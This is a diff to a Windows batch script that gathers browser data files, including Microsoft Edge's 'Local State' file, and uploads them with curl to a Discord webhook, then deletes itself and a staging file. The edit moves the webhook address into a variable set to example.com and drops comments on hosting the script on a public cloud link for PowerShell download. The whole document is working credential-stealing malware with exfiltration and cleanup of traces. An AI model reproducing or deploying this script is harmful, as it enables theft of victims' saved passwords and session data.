@@ -1,10 +1,9 @@
-REM UPLOAD THIS FILE TO GOOGLE DRIVE OR ANY OTHER CLOUD PLATFORM TO ACCESS IT AND TO DOWNLOAD DIRECTLY USING PS
-REM MAKE SURE IT IS PUBLIC LINK
-REM Be Sure To Add a WebHook URL of your Discord Server!
-
 @echo off
 
 setlocal enabledelayedexpansion
+
+REM Add Discord Webhook Url
+set WEBHOOKURL=example.com
 
 set files_to_upload=
 
@@ -28,9 +27,8 @@ if exist "%LocalAppData%\Microsoft\Edge\User Data\Local State" (
 
 curl -X POST -H "Content-Type: multipart/form-data" ^
      !files_to_upload! ^
-REM Put your discord server's webhook url
-     [WEBHOOK URL]  
+     !WEBHOOKURL!  
 
 REM Deletes the bat file from computer
 del "%~f0"
-DEL /F /Q "C:\Users\Public\f2.txt"
+DEL /F /Q "C:\Users\Public\f2.bat"
